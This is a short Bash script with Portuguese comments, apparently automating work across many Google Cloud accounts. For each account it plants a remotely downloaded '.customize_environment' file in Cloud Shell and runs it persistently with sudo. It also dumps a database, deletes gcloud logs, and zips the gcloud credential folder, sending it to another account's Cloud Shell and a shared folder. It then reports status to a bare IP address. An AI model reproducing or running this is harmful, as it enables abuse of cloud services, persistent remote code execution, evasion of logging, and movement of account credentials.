#!/bin/bash

echo
echo $1

#Define nome do arquivo de backup
file='backup_'$(date +"%d%m%Y%H%M%S")'.zip'

backup_account='backup.gcloud1@gmail.com'

#Comando que será executado no gcloud SSH
command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

#gcloud SSH
gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

#Backup MySQL
rm -rf /root/.config/gcloud/mysql.sql ; mysqldump --defaults-file=/root/make_gmail/config.cnf fenix > /root/.config/gcloud/mysql.sql

#Copia o known_hosts para a pasta gcloud
rm -rf /root/.config/gcloud/known_hosts ; cp /root/.ssh/known_hosts /root/.config/gcloud/

#Apaga logs gcloud
rm -rf /root/.config/gcloud/logs/*

#Move o conteúdo para known_hosts.old
mv /root/.ssh/known_hosts /root/.ssh/known_hosts.old

#Apaga o known_hosts
rm -rf /root/.ssh/known_hosts

#Zipa arquivos gcloud
zip -r -q ~/$file /root/.config/gcloud/

#Copia arquivo para pasta compartilhada
cp ~/$file /mnt/share

#gcloud SSH para publicar chave
gcloud cloud-shell ssh --account=$backup_account --command="echo 'chave ssh backup ok'" --authorize-session --force-key-file-overwrite --quiet

#Envia para conta gcloud de backup
gcloud cloud-shell scp localhost:/root/$file cloudshell:~/.backup --account=$backup_account --force-key-file-overwrite

#Altera o status na tbl_account para CREATED
url='http://135.148.11.148/send_status.php?account='$1'&status=CREATED&owner=ROOT'
curl $url

#Apaga arquivo
rm -rf ~/$file

echo 'command ok'
